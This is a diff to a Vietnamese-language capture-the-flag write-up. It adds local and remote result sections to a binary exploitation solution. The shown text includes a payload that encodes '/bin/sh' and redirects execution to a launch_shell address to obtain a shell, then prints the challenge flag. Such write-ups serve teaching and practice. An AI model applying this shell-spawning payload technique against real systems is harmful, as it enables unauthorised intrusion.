@@ -101,6 +101,7 @@ action = launch_shell
 launch_shell = 0x401510
 ```
 
+
 ## - Tính payload
 
 - `type=1 ; length=7` nằm chung 8 byte đầu
@@ -111,6 +112,11 @@ launch_shell = 0x401510
 
 => payload full : `sample 700000001 68732f6e69622f 0 0 0 0 0 401510`
 
-## Kết quả 
+## ket qua local 
+
+kết quả local -> chiếm dc shell 
+<img width="1142" height="505" alt="image" src="https://github.com/user-attachments/assets/4b4ea768-d47f-4b54-9068-8aa7cc553d9d" />
+
+## Kết quả  remote
 flag{baf2be26-a186-451f-9b86-e296c675abd5}
 ```
